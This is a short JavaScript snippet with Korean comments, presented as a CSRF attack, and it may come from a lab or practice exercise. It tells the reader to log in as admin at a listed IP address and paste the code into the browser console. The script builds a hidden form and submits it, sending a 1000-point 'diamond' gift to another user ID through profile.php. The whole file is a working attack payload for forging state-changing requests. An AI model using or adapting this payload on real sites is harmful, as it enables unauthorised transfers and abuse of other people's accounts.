// admin으로 로그인한 상태에서
// http://52.78.221.104/index.php 또는 profile.php에서
// 브라우저 콘솔(F12)에 붙여넣기

console.log('[+] CSRF 공격 시작...');

// 간단한 테스트: 1000P만 전송
const form = document.createElement('form');
form.method = 'POST';
form.action = 'profile.php';
form.style.display = 'none';

const fields = {
    'send_gift': '1',
    'receiver_id': '999',
    'gift_type': 'diamond',
    'points': '1000',
    'message': 'Test'
};

for (let name in fields) {
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = name;
    input.value = fields[name];
    form.appendChild(input);
}

document.body.appendChild(form);
console.log('[+] 폼 생성 완료');
console.log(form);

// 제출
form.submit();
console.log('[+] 폼 제출됨 - 프로필 페이지 새로고침해서 포인트 확인');
